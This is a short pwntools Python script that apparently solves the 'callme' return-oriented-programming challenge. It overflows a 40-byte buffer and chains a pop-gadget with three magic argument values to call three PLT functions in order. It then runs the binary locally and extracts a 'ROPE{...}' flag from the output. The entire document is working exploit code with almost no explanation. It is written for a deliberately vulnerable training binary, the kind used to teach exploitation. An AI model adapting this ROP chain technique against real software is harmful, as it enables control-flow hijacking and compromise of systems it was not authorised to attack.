from pwn import *

GOT_ONE = 0x601040
GOT_TWO = 0x601050
GOT_THREE = 0x601028

PLT_ONE = 0x400720
PLT_TWO = 0x400740
PLT_THREE= 0x4006f0

gadget_return = 0x40093c
gadget = p64(gadget_return) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe)+ p64(0xd00df00dd00df00d)

elf = ELF('callme')
p = process(elf.path)

pay = b'X' * 40
pay += gadget + p64(PLT_ONE)
pay += gadget + p64(PLT_TWO)
pay += gadget + p64(PLT_THREE)


p.sendline(pay)

response = p.recvall()

#  print(response.decode())
#  print(re.search("ROPE{.*?}", response.decode()))

flag = re.findall("ROPE{.*?}", response.decode())

if flag:
    #  print(flag[0])
    print("[-] Get flag!")
    success(flag[0])






